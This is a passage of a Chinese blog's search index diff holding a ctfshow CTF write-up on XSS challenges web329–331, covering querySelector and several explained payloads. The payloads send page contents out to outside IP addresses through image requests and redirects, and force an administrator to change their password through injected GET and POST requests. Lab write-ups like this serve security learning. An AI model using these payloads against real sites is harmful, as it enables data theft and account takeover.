+<p><code>window.location.href = &#39;http://120.46.41.173:9023/&#39; + value.innerHTML;</code><br> 如果条件满足，即当前元素的内容包含 <code>&#39;ctfshow&#123;&#39;</code>，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 <code>&#39;http://120.46.41.173:9023/&#39;</code> 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 <code>&#39;ctfshow&#123;&#39;</code> 以及其他内容。</p>
+</blockquote>
+<p><strong>法三：querySelector方法获取内容</strong></p>
+<p>querySelector：DOM（文档对象模型）选择器，通过CSS选择器从文档中获取一个匹配的元素，返回的是文档中匹配指定的CSS选择器中的第一个元素。    querySelectorAll返回匹配的全部元素</p>
+<p><strong>基本语法：</strong></p>
+<ul>
+<li><code>var element = document.querySelector(selector);</code></li>
+</ul>
+<p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
+<p><strong>web329 payload:</strong></p>
+<p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
+<blockquote>
+<p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
+</blockquote>
+<blockquote>
+<p>img.src &#x3D; “<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
+<p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
+</blockquote>
+<blockquote>
+<p>document.body.append(img) 这段代码将创建的图像元素img添加到页面的body元素内，这样图像就会被加载并显示在页面上.</p>
+</blockquote>
+<p><strong>web330 payload：</strong></p>
+<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=1717&#39;;&lt;/script&gt;</code></p>
+<p>思路：这个题可以修改密码，让admin管理员自己修改密码.</p>
+<p>自己先注册号，在修改密码页面抓包，看是什么情况</p>
+<p><img src="/CTF/Web/XSS/330.01.png"></p>
+<p>很明显，有了路径，且变量p就是我们修改密码的变量</p>
+<p>直接创建账号密码 都为 payload，让admin在点击我们的payload的时候，会自动修改密码为1717</p>
+<p>这个时候我们直接以admin账号 密码为1717登录即可，</p>
+<p>-&gt; 然后点击用户管理（这个时候也相当于点击我们的payload的，会发生页面跳转）</p>
+<p>-&gt; 我们可以点击用户管理的同时打开源码或者抓包。</p>
+<p><strong>web 331：</strong></p>
+<p>这个题变成了post方法，改一改payload即可，其他与上一题一样：</p>
+<p><code>&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;&#125;)&lt;/script&gt;</code></p>
+<p>-&gt; 这段代码是用<code>jQuery</code>库中的 <code>$.ajax()</code> 函数发起的一个异步http请求。</p>
+<p>-&gt; <code>$.ajax(&#123;&#125;)</code> 这是<code>jQuery</code>库提供的用于异步http请求的方法。它接受一个包含配置选项的对象作为参数</p>
+<p>-&gt;<code>url:&quot;api/change.php&quot;</code> 这是请求的目标URL，请求被发送到目标URL，向服务器发送一个HTTP请求</p>
+<p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
+<p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
+<hr>
+<p><a href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload</a></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>漏洞学习</tag>
       </tags>
   </entry>
 </search>
